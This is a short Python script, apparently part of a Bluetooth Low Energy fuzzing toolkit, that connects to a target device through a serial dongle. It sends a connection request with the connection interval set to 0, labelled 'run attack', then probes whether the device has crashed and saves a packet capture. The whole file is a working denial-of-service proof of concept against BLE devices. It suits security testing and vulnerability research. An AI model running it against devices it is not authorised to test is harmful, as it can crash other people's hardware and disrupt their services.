import sys
import constant
from colorama import Fore
from fuzzing.FuzzingBLESUL import FuzzingBLESUL, FuzzedParam

args_len = len(sys.argv)

if args_len < 3:
    sys.exit("Too few arguments provided.\nUsage: python3 connection_interval_crash.py 'serial_port' 'advertiser_address', ['pcap_filename']")

serial_port = sys.argv[1]
advertiser_address = sys.argv[2]

if args_len == 4:
    pcap_filename = sys.argv[3]
else:
    pcap_filename = 'connection_interval_crash_log'

pcap_filename += '.pcap'

ble_sul = FuzzingBLESUL(serial_port, advertiser_address)

# check if initial connection can be established
scan_output = ble_sul.scan_req()
connect_output = ble_sul.connection_request()
ble_sul.termination_indication()
if scan_output == constant.ERROR or connect_output == constant.ERROR:
    print(Fore.RED + "Device cannot be reached!")
    exit()

# run attack
ble_sul.scan_req()
interval = FuzzedParam("interval", 0) 
ble_sul.connection_request_fuzzed(interval)
ble_sul.termination_indication()

# check if device has crashed
crash = True
crash_counter = 0
while crash and crash_counter < constant.CONNECTION_ERROR_ATTEMPTS:
    scan_output = ble_sul.scan_req()
    connect_output = ble_sul.connection_request()
    ble_sul.termination_indication()
    if scan_output != constant.ERROR and connect_output != constant.ERROR:
        crash = False
        break
    crash_counter += 1

if crash:
    print(Fore.RED + "Device might have crashed!")
else:
    print(Fore.GREEN + "Device seems to be okay! No crash detected.")

ble_sul.save_pcap(pcap_filename)

